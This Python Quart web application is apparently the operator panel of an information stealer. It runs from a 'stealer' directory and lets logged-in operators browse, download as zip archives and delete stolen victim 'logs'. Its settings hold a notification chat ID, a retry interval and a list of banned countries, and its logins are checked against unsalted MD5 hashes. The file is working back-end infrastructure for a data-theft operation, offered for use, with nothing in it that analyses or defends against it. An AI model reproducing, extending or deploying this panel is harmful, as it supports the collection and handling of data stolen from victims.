import os
import sys

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
os.chdir("/root/stealer/web_server")

# ~ ~ ~ CODE ~ ~ ~
import re
from os.path import exists
from quart import Quart, request, redirect, render_template, send_file, make_response, send_from_directory
from libs import sql
from libs import functions as func
from libs import config as cfg
import math

app = Quart(__name__, static_url_path="")


async def check_session(sess):
    if sess:
        sess = await sql.get_session(sess)
        if sess:
            if func.stamp() < sess[0]["alive_until"]:  # if sess expire
                user = await sql.get_user(sess[0]["username"])
                if user:
                    return user[0]
    return False


@app.route("/", methods=["GET"])
async def index():
    return redirect("/login")


@app.route("/login", methods=["GET", "POST"])
async def login():
    if await check_session(request.cookies.get("sess")):
        return redirect("/panel")

    if request.method == "POST":
        forms = await request.form
        if func.check_parametrs(forms, ["login", "password"]):
            user = await sql.get_user(forms.get("login"))
            if user:
                if user[0]["password"] == func.md5(forms.get("password")):
                    resp = await make_response(redirect("/panel"))
                    sess = func.uuid4()
                    await sql.create_session(forms.get("login"), sess, func.stamp() + cfg.cookie_alive_time)
                    resp.set_cookie("sess", sess)
                    return resp

    return await render_template(
        "login.html",
        **locals()
    )


@app.route("/settings", methods=["GET", "POST"])
async def settings():
    sess = await check_session(request.cookies.get("sess"))
    if not sess:
        return redirect("/login")

    if request.method == "POST":
        forms = await request.form
        inputs = [["chatid", int], ["retry_time", int], ["banned_countries", str]]
        for _input in inputs:
            if forms.get(_input[0]) is None:
                continue
            if forms.get(_input[0]) != str(sess[_input[0]]):
                val = None
                if _input[1] == int:
                    if forms.get(_input[0]).replace("-", "", 1).isdigit():
                        val = int(forms.get(_input[0]))
                elif _input[1] == str:
                    val = forms.get(_input[0])
                if val is not None:
                    await sql.update_user(sess["username"], _input[0], val)
        sess = (await sql.get_user(sess["username"]))[0]

    return await render_template(
        "settings.html",
        proj_name=cfg.proj_name,
        username=sess["username"],
        chatid=sess["chatid"],
        retry_time=sess["retry_time"],
        banned_countries=sess["banned_countries"]
    )


@app.route("/down/<log_id>")
async def download_log(log_id):
    log_id = re.findall("Log_(\d*)\.zip", log_id)
    if log_id:
        log_id = int(log_id[0])
        sess = await check_session(request.cookies.get("sess"))
        if sess:
            log = await sql.get_user_log(sess["username"], log_id)
            if log:
                return await send_file(func.prepare_log(log[0]))
    return "", 400


@app.route("/panel", methods=["GET"])
async def panel():
    sess = await check_session(request.cookies.get("sess"))
    if not sess:
        return redirect("/login")

    if request.args.get("del") is not None:
        await sql.del_log(sess["username"], request.args.get("del"))
        return redirect("/panel")

    count_of_logs = await sql.get_count_of_logs(sess["username"])

    page = 1
    max_pages = math.ceil(count_of_logs / 10)
    if request.args.get("page") is not None:
        if request.args.get("page").isdigit():
            page = int(request.args.get("page"))
            if page > max_pages:
                page = max_pages
        elif request.args.get("page") == "last":
            page = max_pages

    logs = func.prepare_logs_for_web(await sql.get_logs(sess["username"], page))

    return await render_template(
        "logs.html",
        proj_name=cfg.proj_name,
        username=sess["username"],
        logs=logs,
        showing_logs=len(logs),
        count_of_logs=count_of_logs,
        pagination=func.pagination(page, max_pages)
    )


@app.route("/logout")
async def logout():
    res = await make_response(redirect("/login"))
    res.set_cookie('sess', '', max_age=0)
    return res


@app.errorhandler(404)
async def not_found(error):
    if request.path.startswith("/assets"):
        if exists("templates" + request.path):
            return await send_from_directory('templates', request.path[1:])
    return "<h1>404!<h1>"


app.run(cfg.listen_ip, cfg.web_port)
